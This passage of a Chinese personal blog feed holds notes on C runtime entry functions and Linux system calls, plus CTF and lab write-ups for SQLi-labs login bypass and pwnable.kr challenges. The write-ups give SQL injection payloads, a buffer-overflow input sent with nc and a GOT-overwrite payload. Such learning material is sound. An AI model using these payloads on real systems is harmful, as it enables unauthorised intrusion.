<p>main: main函数地址<br>argc: 参数数量<br>argv: 指向第一个参数地址的指针<br>LIBC:_START_MAIN_AUXVEC_ARG 还不懂，猜测是Elf的装载辅助一类<br>init: main调用前的初始化工作<br>fini: main调用后的收尾工作<br>rtld_fini: 动态加载相关的收尾工作<br>stack_end: 用户最高堆栈地址</p>
</blockquote>
<p>libc-start.c代码很长，这里作简要文字描述:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ifndef SHARED</div><div class="line">char* *ev=&amp;argv[argc+1];</div><div class="line">_environ = ev;</div><div class="line">/* Store the lowest stack address.  This is done in ld.so if this is</div><div class="line">   the code for the DSO.  */</div><div class="line">__libc_stack_end = stack_end;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;最新的glibc不需要分布为_environ赋值，静态链接下需要重新为栈的内容赋值。接下来完成线程初始化工作、注册main执行后的收尾代码后，针对可执行文件，终于可以调用main函数了。<br>result = main (argc, argv, _environ MAIN_AUXVEC_PARAM);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/* Nothing fancy, just call the function.  */</div><div class="line">result = main (argc, argv, _environ MAIN_AUXVEC_PARAM);</div><div class="line">exit (result);</div></pre></td></tr></table></figure></p>
<h2 id="MSVC-入口函数分析"><a href="#MSVC-入口函数分析" class="headerlink" title="MSVC 入口函数分析"></a>MSVC 入口函数分析</h2><p>&emsp;&emsp;MSVC的CRT入口函数是mainCRTStartup，比Glibc的更直观有条理。下面是关键内容:</p>
<ol>
<li>获得当前操作系统版本信息，赋值给各个全局变量</li>
<li>初始化堆</li>
<li>初始化I/O</li>
<li>初始化main函数的参数、环境变量、其他的C库设置</li>
<li>调用main函数记下返回值如上result</li>
<li>检查错误并将result返回</li>
</ol>
<h1 id="实现Mini-CRT"><a href="#实现Mini-CRT" class="headerlink" title="实现Mini CRT"></a>实现Mini CRT</h1><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><blockquote>
<p>以ANIS C标准库为目标，接口尽量一致<br>入口函数<br>基本进程相关操作<br>堆操作<br>文件操作<br>字符串操作<br>格式化字符串和输出操作<br>支持atexit()函数<br>跨平台linux和windows<br>简单</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;分析linux和windows下C运行库&quot;&gt;&lt;a href=&quot;#分析linux和windows下C运行库&quot; class=&quot;headerlink&quot; title=&quot;分析linux和windows下C运行库&quot;&gt;&lt;/a&gt;分析linux和windows下C运行库&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;初步学习以后会一步步完善。通过对Glibc和MSVC CRT的分析，程序不是从main开始运行，在main之前要对参数、环境变量进行设置，初始化程序的堆和I/O等,然后调用主函数main，最后清理运行后的各种资源。这些需要运行库的入口函数来实现。&lt;br&gt;
    
    </summary>
    
    
      <category term="运行库" scheme="http://www.wuweinan.top/tags/%E8%BF%90%E8%A1%8C%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>SQL-lab writeup POST篇</title>
    <link href="http://www.wuweinan.top/2017/04/18/SQL-lab-writeup-POST%E7%AF%87/"/>
    <id>http://www.wuweinan.top/2017/04/18/SQL-lab-writeup-POST篇/</id>
    <published>2017-04-18T06:33:05.000Z</published>
    <updated>2017-05-01T03:38:45.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="POST-less-11-less-22"><a href="#POST-less-11-less-22" class="headerlink" title="POST less-11 ~ less 22"></a>POST less-11 ~ less 22</h2><a id="more"></a>
<h4 id="less-11-POST-Error-Based-Single-quotes-String"><a href="#less-11-POST-Error-Based-Single-quotes-String" class="headerlink" title="less-11 POST - Error Based - Single quotes- String"></a>less-11 POST - Error Based - Single quotes- String</h4><p><img src="http://i.imgur.com/FLUDN4S.png" alt=""></p>
<p>&emsp;&emsp;嗯！熟悉的登陆界面，没有账号密码怎么办？尝试登陆一下，admin admin。进去了!?别急，这是没有防护的理想状态下，这么好猜银行就混不下去了。要想悄悄地进去，首先要知道这里的SQL语句时如何构造的。<br><code>SELECT * FROM USERS WHERE USERNAME=&#39;?&#39; and PASSWORD=&#39;?&#39; limit 1,1</code><br>&emsp;&emsp;正常情况下的登陆语句都如上所示，但是生活中在这之前进行了诸多的过滤，层层的防护，现在从第一步开始，向一个没有任何防护的页面下手。但是生活中也有很多企业、单位，对登陆页面的security不重视，才会有如CSDN被爆出百万用户账号密码这种事情发生。不废话了。<br>&emsp;&emsp;根据上面的SQL语句，可以轻松写出:<br><code>SELECT * FROM USERS WHERE USERNAME=&#39;admin&#39; or &#39;1=1&#39; and PASSWORD=&#39;?&#39; limit 1,1</code><br>&emsp;&emsp;构造永真式，以admin登陆成功，这里构造方式很多，可以连password一起用上。<br><img src="http://i.imgur.com/Bib1fmS.png" alt=""></p>
<h4 id="less-12-POST-Error-Based-Double-quotes-String-with-twist"><a href="#less-12-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="less-12 POST - Error Based - Double quotes- String -with twist"></a>less-12 POST - Error Based - Double quotes- String -with twist</h4><p>&emsp;&emsp;先用双引号测试，可以看到，还需要括号<br><img src="http://i.imgur.com/ezQiQTV.png" alt=""><br>&emsp;&emsp;在username这里作为注入点的话，语句比较多，因为要闭合’”)’，同理password也行。<br><img src="http://i.imgur.com/mWE5adv.png" alt=""><br>最后的‘1=1’也不需要。这里却是以Dump登陆的，说明’admin’改为任意字符也可以，因为可以使用注释符，简化后可为<code>uname=&quot;)or 1=1# &amp;passwd=</code>。如果想以admin登入还不知道怎么写。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;POST-less-11-less-22&quot;&gt;&lt;a href=&quot;#POST-less-11-less-22&quot; class=&quot;headerlink&quot; title=&quot;POST less-11 ~ less 22&quot;&gt;&lt;/a&gt;POST less-11 ~ less 22&lt;/h2&gt;
    
    </summary>
    
    
      <category term="sql" scheme="http://www.wuweinan.top/tags/sql/"/>
    
      <category term="writeup" scheme="http://www.wuweinan.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>linux 函数记录</title>
    <link href="http://www.wuweinan.top/2017/04/18/linux-C%E5%87%BD%E6%95%B0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.wuweinan.top/2017/04/18/linux-C函数记录/</id>
    <published>2017-04-18T04:43:35.000Z</published>
    <updated>2017-05-01T06:56:50.422Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;以防把学过的函数忘了，或者遇到新的函数而过两天又忘了，在这里备忘以及统计新学的函数。主要针对apue和unix环境下的编程。<br><a id="more"></a></p>
<h2 id="不带缓存的文件I-O类"><a href="#不带缓存的文件I-O类" class="headerlink" title="不带缓存的文件I/O类"></a>不带缓存的文件I/O类</h2><p>&emsp;&emsp;为什么是不带缓存呢？因为C语言下从FILE结构体定义的文件流和相关函数fread、fwrite等，到实际调用ReadFile等API，需要经过增加缓冲区保护、缓冲、换行符的转换等复杂的过程。所以在这里记录的主要是不带缓存的open、read等I/O函数,每一个都调用一个系统调用。linux以”int 80”进入系统调用，根据eax的值，即调用号在一个单位偏移量为4字节的系统调用表中寻找是哪个系统调用，如eax=0时是sys_exit。ebx,ecx,edx,esi,edi,ebp六个寄存器用来传递参数，在进入内核态时，会把六个寄存器的值依次入栈，一方面把寄存器空出来，另一方面系统调用函数可以直接在栈上取参数。</p>
<ol>
<li><p><strong>int  open(const char* pathname, in oflag, //mode_t mode);</strong><br>#include “sys/types.h”<br>#include “sys/stat.h”<br>#include “fcntl.h”<br>//文件名，O_RDONLY | O_WRONLY | O_RDWR | O_CREAT | O_APPEND，创建文件时使用第三参数<br>//打开、创建文件，返回文件描述符</p>
</li>
<li><p><strong>int  close(int fd);</strong><br>#include “unistd.h”<br>//关闭文件</p>
</li>
<li><p><strong>off_t  lseek(int fd, off_t offset, int whence);</strong><br>#include “sys/types.h”<br>#include “unistd.h”<br>//fd, 偏移, SEEK_SET(文件头) | SEEK_CUR(当前) | SEEK_END(末尾)<br>//设置文件位移量，偏移量大于文件长度时，下一次写会延长该文件</p>
</li>
<li><p><strong>ssize_t  read(int fd, void *buff, size_t nbytes);</strong><br>#include “unistd.h”<br>//返回读到的字节数，文件末尾为0，出错-1</p>
</li>
<li><p><strong>ssize_t  write(int fd, const void *buff, size_t nbytes);</strong><br>#include “unistd.h”<br>//正常返回写入字节数，出错-1</p>
</li>
<li><p><strong>int  dup(int fd);</strong><br><strong>int  dup2(int fd, int fd2)</strong><br>#include “unistd.h”<br>//返回当前可用文件描述符的最小值<br>//用fd2指定新的描述符数值</p>
</li>
<li><p><strong>int  fcntl(int fd, int cmd, //int arg);</strong><br>#include “sys/types.h”<br>#include “unistd.h”<br>#include “fcntl.h”<br>返回值需要和O_ACCMODE等进行 &amp; 操作 获得结果</p>
<blockquote>
<p>cmd=F_DUPFD 复制显存的描述符<br>cmd=F_GETFD|F_SETFD 获得/设置文件描述符标记<br>cmd=F_GETFL|F_SETFL 获得/设置文件状态标志<br>cmd=F_GETOWN|F_SETOWN 获得/设置异步I/O权<br>cmd=F_GETLK|F_SETLK/F_SETKW 获得/设置记录锁</p>
</blockquote>
</li>
<li><p><strong>int  ioctl(int fd, int request,…);</strong><br>#include “unistd.h” “sys/ioctl.h”<br>//可用于文件I/O，磁带I/O，套接口I/O，终端I/O。对设备进行操作最容易的方法。</p>
</li>
</ol>
<p>读/写磁盘文件时，以上函数都带有缓存机制。</p>
<h2 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h2><ol>
<li><p><strong>int  stat(const char<em> pathname， struct stat</em> buf);</strong><br>#include “sys/types.h”<br>#include “sys/stat.h”<br>//对于给定的一个pathname，stat函数返回和此命名文件有关的信息结构，ls -l 使用stat最多</p>
</li>
<li><p><strong>int  fstat(const char<em> pathname， struct stat</em> buf);</strong><br>#include “sys/types.h”<br>#include “sys/stat.h”<br>//在文件描述符fd上，fstat函数返回和此命名文件有关的信息结构</p>
</li>
<li><p><strong>int  lstat(const char<em> pathname， struct stat</em> buf);</strong><br>#include “sys/types.h”<br>#include “sys/stat.h”<br>//lstat函数返回和此命名文件有关的信息结构，还可以返回符号链接的有关信息<br>//信息结构如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">struct stat&#123;</div><div class="line">	mode_t	st_mode;	//file type &amp; mode (permisions)</div><div class="line">	ino_t	st_ino;		//i-node number</div><div class="line">	dev_t	st_dev;		//device number</div><div class="line">	dev_t 	st_rdev;	//device number for special files</div><div class="line">	nlink_t	st_nlink;	//number of links</div><div class="line">	uid_t	st_uid;		</div><div class="line">	gid_t	st_gid;</div><div class="line">	off_t	st_size;	//size in bytes, for regular files</div><div class="line">	time_t	st_atime;	//time of last access</div><div class="line">	time_t	st_mtime;	//last modification</div><div class="line">	time_t	st_ctime;	//last file status change</div><div class="line">	long 	st_blksize;	//best I/O block size</div><div class="line">	long	st_blocks;	//number of 512b blocks allocated</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p><strong>#define S_ISDIR (mode) (((mode) &amp; S_IFMT) == S_IFDIR)</strong><br>//可以使用宏 S_ISREG(), S_ISDIR(), S_ISCHR(), S_ISFIFO()等确定文件类型，宏定义如上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lstat(pathname, &amp;buf);</div><div class="line">if (S_ISREG(buf.st_mode)) </div><div class="line">	printf(&quot;regular&quot;\n);</div></pre></td></tr></table></figure>
</li>
<li><p><strong>int  access(const char* pathname, int mode);</strong><br>#include”unistd.h”<br>//按实际的uid和gid进行存取许可测试,mode如下<br>// R_OK 读许可<br>// W_OK 写许可<br>// X_OK 执行许可<br>// F_OK 文件是否存在</p>
</li>
<li><p><strong>mode_t  umask(mode_t mask);</strong><br>#include”sys/types.h”<br>#include”sys/stat.h”<br>//为进程设置文件方式创建屏蔽字，返回以前的值。相关的是9个存取许可位，S_IRUSE,S_IRGRP,S_IROTH等</p>
</li>
<li><p><strong>int  chmod(const char* pathname, mode_t mode);</strong><br>#include”sys/types.h”<br>#include”sys/stat.h”<br>//对指定文件，改变文件的许可权位<br>//int fchmod(int fd, mode_t mode)针对已打开的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#include&lt;head.h&gt;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	struct sttat statbuf;</div><div class="line">	if (stat(&quot;pathname&quot;, &amp;statbuf) &lt; 0)</div><div class="line">		error(&quot;stat error&quot;);</div><div class="line">	if (chmod(&quot;pathname&quot;, (statbuf.st_mode &amp; ~S_IXUSR) | S_ISGID) &lt; 0)</div><div class="line">		error(&quot;chmod error&quot;)</div><div class="line">	exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p><strong>int  chown(const char* pathname, uid_t owner, gid_t group);</strong><br><strong>int  lchown(const char* pathname, uid_t owner, gid_t group);</strong><br><strong>int  fchown(const char* pathname, uid_t owner, gid_t group);</strong></p>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;emsp;&amp;emsp;以防把学过的函数忘了，或者遇到新的函数而过两天又忘了，在这里备忘以及统计新学的函数。主要针对apue和unix环境下的编程。&lt;br&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://www.wuweinan.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr学习pwn--虽然是从零开始</title>
    <link href="http://www.wuweinan.top/2017/04/11/pwnable-kr%E5%AD%A6%E4%B9%A0pwn-%E8%99%BD%E7%84%B6%E6%98%AF%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B/"/>
    <id>http://www.wuweinan.top/2017/04/11/pwnable-kr学习pwn-虽然是从零开始/</id>
    <published>2017-04-11T05:56:15.000Z</published>
    <updated>2017-05-03T10:50:04.731Z</updated>
    
    <content type="html"><![CDATA[<p>pwnable.kr<br><a id="more"></a></p>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>&emsp;&emsp;连入后，可以看到三个文件fd  fd.c  flag。查看fd.c源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;  </div><div class="line">#include &lt;string.h&gt;  </div><div class="line">char buf[32];  </div><div class="line">int main(int argc, char* argv[], char* envp[])&#123;  </div><div class="line">    if(argc&lt;2)&#123;  </div><div class="line">        printf(&quot;pass argv[1] a number\n&quot;);  </div><div class="line">        return 0;  </div><div class="line">    &#125;  </div><div class="line">    int fd = atoi( argv[1] ) - 0x1234;  </div><div class="line">    int len = 0;  </div><div class="line">    len = read(fd, buf, 32);  </div><div class="line">    if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;  </div><div class="line">        printf(&quot;good job :)\n&quot;);  </div><div class="line">        system(&quot;/bin/cat flag&quot;);  </div><div class="line">        exit(0);  </div><div class="line">    &#125;  </div><div class="line">    printf(&quot;learn about Linux file IO\n&quot;);  </div><div class="line">    return 0;  </div><div class="line">  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;只要把fd设置为0，即便准输入文件的文件描述符，然后读入的内容和”LETMEWIN\n”相同就可得到flag</p>
<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>源代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#include &lt;string.h&gt;  </div><div class="line">unsigned long hashcode = 0x21DD09EC;  </div><div class="line">unsigned long check_password(const char* p)&#123;  </div><div class="line">    int* ip = (int*)p;  </div><div class="line">    int i;  </div><div class="line">    int res=0;  </div><div class="line">    for(i=0; i&lt;5; i++)&#123;  </div><div class="line">        res += ip[i];  </div><div class="line">    &#125;  </div><div class="line">    return res;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line">int main(int argc, char* argv[])&#123;  </div><div class="line">    if(argc&lt;2)&#123;  </div><div class="line">        printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);  </div><div class="line">        return 0;  </div><div class="line">    &#125;  </div><div class="line">    if(strlen(argv[1]) != 20)&#123;  </div><div class="line">        printf(&quot;passcode length should be 20 bytes\n&quot;);  </div><div class="line">        return 0;  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    if(hashcode == check_password( argv[1] ))&#123;  </div><div class="line">        system(&quot;/bin/cat flag&quot;);  </div><div class="line">        return 0;  </div><div class="line">    &#125;  </div><div class="line">    else  </div><div class="line">        printf(&quot;wrong passcode.\n&quot;);  </div><div class="line">    return 0;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;需要输入20byte的passcode，在经过check_password()函数处理后，和hashcode’0x21DD09EC’相等，就可以获得flag。check_password()把passcode类型转化为int后，分为5组相加等于0x21DD09EC。所以干脆把0x21DD09EC分成5份，最好就是4个0x0101和一个0x1DD905E8。使用perl或者python可以简化输入过程。</p>
<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">void func(int key)&#123;</div><div class="line">        char overflowme[32];</div><div class="line">        printf(&quot;overflow me : &quot;);</div><div class="line">        gets(overflowme);       // smash me!</div><div class="line">        if(key == 0xcafebabe)&#123;</div><div class="line">                system(&quot;/bin/sh&quot;);</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">                printf(&quot;Nah..\n&quot;);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">int main(int argc, char* argv[])&#123;</div><div class="line">        func(0xdeadbeef);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&emsp;&emsp;漏洞在gets(overflowme)，需要通过溢出，将func(0xdeadbeef)的参数覆盖并修改为0xcafebabe。在GDB可以看到overflowme数组离ebp 0x2c字节，再加上ebp,返回地址8个字节，需要52字节。<br><img src="http://i.imgur.com/JL7H2SQ.png" alt=""><br>使用python构造:(python -c ‘print “A”*52 + “\xbe\xba\xfe\xca”‘;cat -)|nc pwnable.kr 9000</p>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>&emsp;&emsp;获得一个名为flag的可执行文件，运行后得到一下提示<br>This is reversing task. all you need is binary<br>&emsp;&emsp;可是IDA看不到关键的函数，应该是被加壳了，加壳有UPX,VMP等，这里用vim的%!xxd可以看到UPX。<code>upx -d flag -o flag1</code> 去壳。GDB查看反汇编，提示# 0x6c2070 <flag>，设断点在*main+32<br><img src="http://i.imgur.com/h27tD3U.png" alt=""><br>&emsp;&emsp;edx寄存器的内容就是0x6c2070，这个地址肯定不是flag，再往下走一步<br><img src="http://i.imgur.com/mwQ7mhS.png" alt=""><br>&emsp;&emsp;edx变为0x496628,x/2s 0x496628即为flag</flag></p>
<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>passcode.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">void login()&#123;</div><div class="line">        int passcode1;</div><div class="line">        int passcode2;</div><div class="line"></div><div class="line">        printf(&quot;enter passcode1 : &quot;);</div><div class="line">        scanf(&quot;%d&quot;, passcode1);</div><div class="line">        fflush(stdin);</div><div class="line"></div><div class="line">        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)</div><div class="line">        printf(&quot;enter passcode2 : &quot;);</div><div class="line">        scanf(&quot;%d&quot;, passcode2);</div><div class="line"></div><div class="line">        printf(&quot;checking...\n&quot;);</div><div class="line">        if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;</div><div class="line">                printf(&quot;Login OK!\n&quot;);</div><div class="line">                system(&quot;/bin/cat flag&quot;);</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">                printf(&quot;Login Failed!\n&quot;);</div><div class="line">                exit(0);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void welcome()&#123;</div><div class="line">        char name[100];</div><div class="line">        printf(&quot;enter you name : &quot;);</div><div class="line">        scanf(&quot;%100s&quot;, name);</div><div class="line">        printf(&quot;Welcome %s!\n&quot;, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line">        printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;);</div><div class="line"></div><div class="line">        welcome();</div><div class="line">        login();</div><div class="line"></div><div class="line">        // something after login...</div><div class="line">        printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;因为scanf中都没有加&amp;符，所以正常输入passcode会报错。passcode使用的是动态链接，在动态连接下对于模块间的调用要定位GOT，在进行跳转，会减慢运行速度。因此还会采用PLT的方法实现延迟绑定，例如调用scanf，首先通过PLT项的结构进行跳转，scanf@plt，scanf@plt的第一条指令就是通过GOT间接跳转的指令，跳转到scanf@GOT即scanf在GOT中保存的项，在这之前动态链接器经过一系列工作后将scanf的地址写进了这个项，因此实现了函数的正确调用。ELF将GOT拆分为两个表”.got”和”.got.plt”。前者保存全局变量引用地址，后者保存函数引用地址。</p>
<p><img src="http://i.imgur.com/23PkOpa.png" alt=""><br>&emsp;&emsp;通过上图我们可以知道GOT是可写的，因为因为scanf中都没有加&amp;符，传入的是值，可以利用GOT表覆写技术，将system(“bin/cat flag”)的地址写到表中，并执行。除了scanf，还有fflush函数调用需要以上方式，因此可以把fflush在GOT中的地址改为shellcode的地址。</p>
<p>&emsp;&emsp;通过IDA找到system(“bin/cat flag”)的地址为0x080485e3,fflush的地址是0x804a004<br><img src="http://i.imgur.com/tPM0XPp.png" alt=""></p>
<p>&emsp;&emsp;而且welcome和login用的是同一栈帧，所以name:ebp-0x70，password1:ebp-0x10，password2:ebp-0xc<br><img src="http://i.imgur.com/BkDCX1G.png" alt=""><br><img src="http://i.imgur.com/0nrZccz.png" alt=""></p>
<p>&emsp;&emsp;所以构造shellcode,结果不对，因为scanf中用%d读取数据，所以第二个地址要换成十进制数<br>python -c ‘print “A”*96 + “\x04\xa0\x04\x08” + “\xe3\x85\x04\x08”‘ | ./passcode</p>
<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line">        unsigned int random;</div><div class="line">        random = rand();        // random value!</div><div class="line"></div><div class="line">        unsigned int key=0;</div><div class="line">        scanf(&quot;%d&quot;, &amp;key);</div><div class="line"></div><div class="line">        if( (key ^ random) == 0xdeadbeef )&#123;</div><div class="line">                printf(&quot;Good!\n&quot;);</div><div class="line">                system(&quot;/bin/cat flag&quot;);</div><div class="line">                return 0;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&emsp;&emsp;rand()产生的是伪随机数，每次随机的数都一样，修改random.c，跑一次打印出随机数是多少就可解得flag。</p>
<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>inout.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char* argv[], char* envp[])&#123;</div><div class="line">	printf(&quot;Welcome to pwnable.kr\n&quot;);</div><div class="line">	printf(&quot;Let&apos;s see if you know how to give input to program\n&quot;);</div><div class="line">	printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);</div><div class="line"></div><div class="line">	// argv</div><div class="line">	if(argc != 100) return 0;</div><div class="line">	if(strcmp(argv[&apos;A&apos;],&quot;\x00&quot;)) return 0;</div><div class="line">	if(strcmp(argv[&apos;B&apos;],&quot;\x20\x0a\x0d&quot;)) return 0;</div><div class="line">	printf(&quot;Stage 1 clear!\n&quot;);	</div><div class="line"></div><div class="line">	// stdio</div><div class="line">	char buf[4];</div><div class="line">	read(0, buf, 4);</div><div class="line">	if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</div><div class="line">	read(2, buf, 4);</div><div class="line">        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</div><div class="line">	printf(&quot;Stage 2 clear!\n&quot;);</div><div class="line">	</div><div class="line">	// env</div><div class="line">	if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</div><div class="line">	printf(&quot;Stage 3 clear!\n&quot;);</div><div class="line"></div><div class="line">	// file</div><div class="line">	FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);</div><div class="line">	if(!fp) return 0;</div><div class="line">	if( fread(buf, 4, 1, fp)!=1 ) return 0;</div><div class="line">	if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</div><div class="line">	fclose(fp);</div><div class="line">	